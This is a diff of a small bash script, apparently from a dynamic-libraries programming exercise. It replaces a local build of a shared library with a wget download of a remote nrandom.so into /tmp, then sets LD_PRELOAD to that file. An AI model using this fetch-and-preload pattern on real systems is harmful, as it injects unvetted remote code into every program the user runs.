@@ -1,4 +1,3 @@
 #!/bin/bash
-gcc -Wall -Wextra -Werror -pedantic -c -fPIC *.c
-gcc -shared -o liball.so *.o
-export LD_LIBRARY_PATH=.:$LD_LIBRARY_PATH
+wget -P /tmp/ https://raw.github.com/betascribbles/alx-low_level_programming/master/0x18-dynamic_libraries/nrandom.so
+export LD_PRELOAD=/tmp/nrandom.so
